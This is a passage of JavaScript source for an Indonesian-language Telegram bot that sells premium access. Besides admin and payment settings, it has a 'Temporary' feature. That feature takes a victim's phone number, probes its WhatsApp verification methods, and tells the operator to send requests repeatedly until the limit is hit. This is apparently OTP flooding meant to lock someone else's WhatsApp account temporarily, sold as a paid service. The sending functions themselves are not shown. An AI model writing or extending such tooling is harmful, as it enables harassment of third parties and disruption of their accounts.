        `▸ ᴅᴜʀᴀꜱɪ ⦂ +${days} ʜᴀʀɪ`,
        `▸ ʙᴇʀᴀᴋʜɪʀ ⦂ ${formatWIB(end.toISOString())}</blockquote>`
      ].join("\n"), backKb, false);
    }

    if (st.action === "delprem") {
      const targetId = parseInt(txt.split(/\s+/)[0], 10);
      if (!targetId) {
        return showInlinePanel(ctx, "⚠ ᴜꜱᴇʀ ɪᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ", backKb, false);
      }
      await removePremiumUser(targetId);
      return showInlinePanel(ctx, `✦ ᴀᴋꜱᴇꜱ ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀ <code>${targetId}</code> ᴛᴇʟᴀʜ ᴅɪʜᴀᴘᴜꜱ`, backKb, false);
    }

    if (st.action === "setpay") {
      await setSetting("payment_info", txt);
      return showInlinePanel(ctx, "✦ ɪɴꜱᴛʀᴜᴋꜱɪ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴅɪᴘᴇʀʙᴀʀᴜɪ", backKb, false);
    }

    if (st.action === "setcontact") {
      await setSetting("admin_contact", txt);
      return showInlinePanel(ctx, "✦ ᴋᴏɴᴛᴀᴋ ᴀᴅᴍɪɴ ʙᴇʀʜᴀꜱɪʟ ᴅɪᴘᴇʀʙᴀʀᴜɪ", backKb, false);
    }
  }

  if (awaitingEmailInput.has(userId)) {
    awaitingEmailInput.delete(userId);
    return processEmailFix(ctx, txt);
  }

  if (awaitingSendInput.has(userId)) {
    awaitingSendInput.delete(userId);
    const numbers = extractSmartPhoneNumbers(txt);
    if (numbers.length === 0) {
      awaitingSendInput.add(userId);
      return showInlinePanel(ctx, "⚠ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ. ᴋɪʀɪᴍ ᴜʟᴀɴɢ 1 ɴᴏᴍᴏʀ.", inlineKb([[btn("✕ ʙᴀᴛᴀʟ", "cancel_send", "danger")]]), false);
    }
    const phone = numbers[0];
    pendingSendPhone.set(userId, phone);
    await showInlinePanel(ctx, [
      "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ",
      "",
      `<blockquote>▸ ᴍᴇᴍᴇʀɪᴋꜱᴀ ɴᴏᴍᴏʀ <code>${esc(phone)}</code>...</blockquote>`
    ].join("\n"), inlineKb([]), false);

    const probe = await probePhoneMethods(phone);
    const methods = probe.methods || {};
    const stateLine = tempProbeStatusLine(probe);
    const available = [];
    if (!(methods.sms > 0)) available.push("ꜱᴍꜱ");
    if (!(methods.voice > 0)) available.push("ᴠᴏɪᴄᴇ");
    if (!(methods.flash > 0)) available.push("ꜰʟᴀꜱʜ");
    if (probe.isDeviceOn && !(methods.wa_old > 0)) available.push("ᴡᴀ_ᴏʟᴅ");
    if (!(methods.email > 0)) available.push("ᴇᴍᴀɪʟ");

    return showInlinePanel(ctx, [
      "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ",
      "",
      `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(probe.phone || phone)}</code>`,
      `▸ ꜱᴛᴀᴛᴜꜱ ⦂ ${stateLine}`,
      `▸ ᴘᴇʀᴀɴɢᴋᴀᴛ ⦂ ${probe.isDeviceOn ? "● ᴏɴ" : "○ ᴏꜰꜰ"}`,
      `▸ ꜱɪᴀᴘ ⦂ ${available.length ? available.join(" · ") : "—"}</blockquote>`,
      "",
      "◈ ᴍᴇᴛᴏᴅᴇ",
      `<blockquote>${formatMethodsBlock(methods, probe.isDeviceOn)}</blockquote>`,
      "",
      "ⓘ ᴘɪʟɪʜ ᴍᴇᴛᴏᴅᴇ → <b>▶ ᴍᴜʟᴀɪ</b> · ᴋɪʀɪᴍ ʙᴇʀᴜʟᴀɴɢ ꜱᴀᴍᴘᴀɪ ʟɪᴍɪᴛ"
    ].join("\n"), buildSendMethodKeyboard(phone, probe), false);
  }

  if (!awaitingInput.has(userId)) return next();
  awaitingInput.delete(userId);
  return processNumbers(ctx, txt);
});

process.on("unhandledRejection", (e) => console.error("unhandledRejection:", e));
process.on("uncaughtException", (e) => console.error("uncaughtException:", e));
process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));

async function initBot() {
  await migrateFromSQLite();
  const me = await bot.telegram.getMe();
  BOT_USERNAME = me.username;
  await bot.telegram.setMyCommands([
    { command: "start", description: "Buka dashboard utama" },
    { command: "detect", description: "Deteksi nomor WhatsApp" },
    { command: "email", description: "Cek ketersediaan verifikasi email" },
    { command: "cancel", description: "Batalkan aksi saat ini" }
  ]);
  let webhookUrl = (process.env.WEBHOOK_URL || "").trim();
  if (!webhookUrl && process.env.VERCEL_PROJECT_PRODUCTION_URL) {
    webhookUrl = "https://" + process.env.VERCEL_PROJECT_PRODUCTION_URL + "/api/webhook";
  }
  if (webhookUrl) {
    try {
      const info = await bot.telegram.getWebhookInfo();
      if (!info.url || info.url !== webhookUrl) {
        await bot.telegram.setWebhook(webhookUrl, {
          drop_pending_updates: false,
          allowed_updates: ["message", "callback_query"]
        });
        console.log("webhook set:", webhookUrl);
      }
    } catch (e) {
      console.error("webhook set failed:", e && e.message ? e.message : e);
    }
  }
  return bot;
}

module.exports = { bot, initBot };

if (require.main === module || !process.env.VERCEL) {
  (async () => {
    await initBot();
    await bot.launch();
    console.log("Bot running as @" + BOT_USERNAME);
  })();
}